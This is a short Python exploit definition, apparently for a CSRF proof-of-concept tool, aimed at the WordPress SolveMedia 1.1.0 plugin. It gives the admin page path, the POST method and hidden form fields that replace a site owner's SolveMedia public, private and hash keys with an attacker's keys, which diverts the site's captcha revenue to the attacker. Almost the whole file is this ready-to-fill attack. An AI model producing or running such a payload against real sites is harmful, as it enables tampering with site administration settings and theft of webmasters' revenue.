# -*- coding: utf-8 -*-

NAME = "WordPress SolveMedia 1.1.0 CSRF Vulnerability"
DESCRIPTION = '''SolveMedia is a captcha service that allows webmasters to monetize from correct captcha type-ins, solvemedia.admin.inc is vulnerable to CSRF, there is no anti-CSRF tokens implemented nor is the wp-nonce function used, therefore an attacker can change the webmasters SolveMedia API Keys (public key, private key, hash key) to the attackers own set of API keys thus stealing the webmasters SolveMedia revenue.'''

AUTHOR = "Junaid Hussain"
AUTHOR_URL = "http://illSecure.com"
DATE = "2013-01-13"

METHOD = "POST"
PATH = "/wp-admin/plugins.php?page=solvemedia/solvemedia.admin.inc&updated=true"

PARAMS = [
    {
        "type": "hidden",
        "name": "adcopy_opt_pubkey",
        "id": "adcopy_opt_pubkey",
        "value": "[PUBLIC KEY]",
        "size": "40",
        "custom": True,
        "description": "Public key of the attacker."
    },
    {
        "type": "hidden",
        "name": "adcopy_opt_privkey",
        "id": "adcopy_opt_privkey",
        "value": "[PRIVATE KEY]",
        "size": "40",
        "custom": True,
        "description": "Private key of the attacker."
    },
    {
        "type": "hidden",
        "name": "adcopy_opt_hashkey",
        "id": "adcopy_opt_hashkey",
        "value": "[HASH KEY]",
        "size": "40",
        "custom": True,
        "description": "Hash key of the attacker."
    },
    {
        "type": "submit",
        "name": "submit",
        "value": "Enter",
        "custom": False
    }
]